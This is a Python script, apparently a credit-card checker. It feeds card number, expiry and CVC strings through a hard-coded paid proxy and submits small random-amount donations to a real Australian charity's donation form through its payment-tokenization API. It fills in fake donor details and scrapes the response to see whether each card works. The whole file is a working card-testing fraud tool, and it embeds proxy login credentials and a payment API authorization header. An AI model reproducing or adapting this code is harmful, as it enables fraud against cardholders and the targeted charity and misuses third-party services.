import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-scrapping:brgtmv5nyk7u"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	url = "https://billygraham.org.au/wp-json/gf/v2/forms/2/submissions"
	
	payload = {
	  'input_5': "$ 0.00",
	  'input_1.3': "",
	  'input_1.6': "",
	  'input_9.1': "",
	  'input_9.2': "",
	  'input_9.3': "",
	  'input_9.4': "",
	  'input_9.5': "",
	  'input_9.6': "Australia",
	  'gpaa_place_9': "",
	  'input_2': "",
	  'input_2_2': "",
	  'input_18': "",
	  'input_13': "",
	  'input_11.1': "",
	  'input_11.2': "",
	  'input_12.2': "I have read and agree to the <a target=\"_blank\" href=\"https://billygraham.org.au/terms-conditions-privacy-policy/\">website terms and conditions*</a>",
	  'input_12.3': "1",
	  'input_17': "",
	  'input_22': "",
	  'gform_submission_method': "postback",
	  'gform_theme': "orbital",
	  'gform_style_settings': "{\"theme\":\"orbital\",\"inputPrimaryColor\":\"#204ce5\"}",
	  'is_submit_2': "1",
	  'gform_submit': "2",
	  'gform_unique_id': "",
	  'state_2': "WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcIjU5ZTdkNjYyMDgzYTJhZWYwOTllOTZjYmJlZWJhMzk5XCJ9IiwiMzVhN2ZiNDYwZGFhYTI1NGMzZDc3NDYyNDljODA4YjMiXQ==",
	  'gform_target_page_number_2': "0",
	  'gform_source_page_number_2': "1",
	  'gform_field_values': "",
	  'gform_save': "true"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'authority': "billygraham.org.au",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://billygraham.org.au",
	  'referer': "https://billygraham.org.au/donate/your-gift-to-where-most-needed/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	resume_token = re.search(r'"resume_token":"(.*?)"', response.text).group(1)
	
	url = "https://api.payway.com.au/rest/v1/single-use-tokens"
	
	payload = {
	  'paymentMethod': "creditCard",
	  'connectionType': "FRAME",
	  'cardNumber': n,
	  'cvn': cvc,
	  'cardholderName': "Dao Khao Saard",
	  'expiryDateMonth': mm,
	  'expiryDateYear': yy,
	  'threeDS2': "false"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'authority': "api.payway.com.au",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'authorization': "Basic UTEwNzM1X1BVQl9xdzdqc2dqdzlxZXM0dGdzN255N3RpencycGtxdWJzc2pmbmlyZjZpYzI1cjZrZXhmOWJkbTJxa2Z2YnY6",
	  'origin': "https://api.payway.com.au",
	  'referer': "https://api.payway.com.au/rest/v1/creditCard-iframe.htm",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-no-authenticate-basic': "true",
	  'x-requested-with': "XMLHttpRequest"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	token = response.json()['singleUseTokenId']
	
	url = "https://billygraham.org.au/donate/your-gift-to-where-most-needed/"
	
	payload = {
	  'input_3': 'Other amount|0',
	  'input_4': f'$ {random_amount1}.{random_amount2}',
	  'input_5': f'$ {random_amount1}.{random_amount2}',
	  'input_1.3': 'Rodam',
	  'input_1.6': 'User',
	  'input_9.1': 'Street 27',
	  'input_9.2': '',
	  'input_9.3': 'New York',
	  'input_9.4': 'New York',
	  'input_9.5': '10080',
	  'input_9.6': 'United States',
	  'gpaa_place_9': '',
	  'input_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	  'input_2_2': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	  'input_18': '',
	  'input_13': '',
	  'input_11.1': '',
	  'input_11.2': token,
	  'input_12.1': '1',
	  'input_12.2': 'I have read and agree to the <a target="_blank" href="https://billygraham.org.au/terms-conditions-privacy-policy/">website terms and conditions*</a>',
	  'input_12.3': '1',
	  'input_17': '',
	  'input_22': '',
	  'gform_submission_method': 'postback',
	  'gform_theme': 'orbital',
	  'gform_style_settings': '{"theme":"orbital","inputPrimaryColor":"#204ce5"}',
	  'is_submit_2': '1',
	  'gform_submit': '2',
	  'gform_unique_id': '',
	  'state_2': 'WyJ7XCIzXCI6W1wiMmYxYThlMWZmM2ZlYjViZDMxZTBjNjc0YmU4NDVkMGJcIixcIjJhZTcyMmY3NjFkYjliZTY3MTAyOTZiMzk0ZDE3NDNlXCIsXCI4YjQ2ODU4ZDZmYTYwODQ4YTQ5OGUzOTQyN2U5YmY3MlwiLFwiZGU1ZGY2MmZhMjIzNGNhYzY2OWJjZjA2MjZmZmIzY2JcIl0sXCIxMi4xXCI6XCI1OWU3ZDY2MjA4M2EyYWVmMDk5ZTk2Y2JiZWViYTM5OVwiLFwiMTIuMlwiOlwiMzExMjE1MjBkZjhjNjI0NjBiMmZkNDUyZTQ3ZDlmZjNcIixcIjEyLjNcIjpcIjU5ZTdkNjYyMDgzYTJhZWYwOTllOTZjYmJlZWJhMzk5XCJ9IiwiMzVhN2ZiNDYwZGFhYTI1NGMzZDc3NDYyNDljODA4YjMiXQ==',
	  'gform_target_page_number_2': '0',
	  'gform_source_page_number_2': '1',
	  'gform_field_values': '',
	  'resume_token': resume_token,
	  'version_hash': 'c06e4e53ddd3d70df325d5d991ac585b'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'authority': "billygraham.org.au",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'cache-control': "max-age=0",
	  'origin': "https://billygraham.org.au",
	  'referer': "https://billygraham.org.au/donate/your-gift-to-where-most-needed/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "document",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-user': "?1",
	  'upgrade-insecure-requests': "1"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	try:
		result = re.search(r'#8211; (.*?)<\/div>', response.text).group(1)
	except:
		result = re.search(r'<h4>(.*?)<\/h4>', response.text).group(1)
		
	return (result)
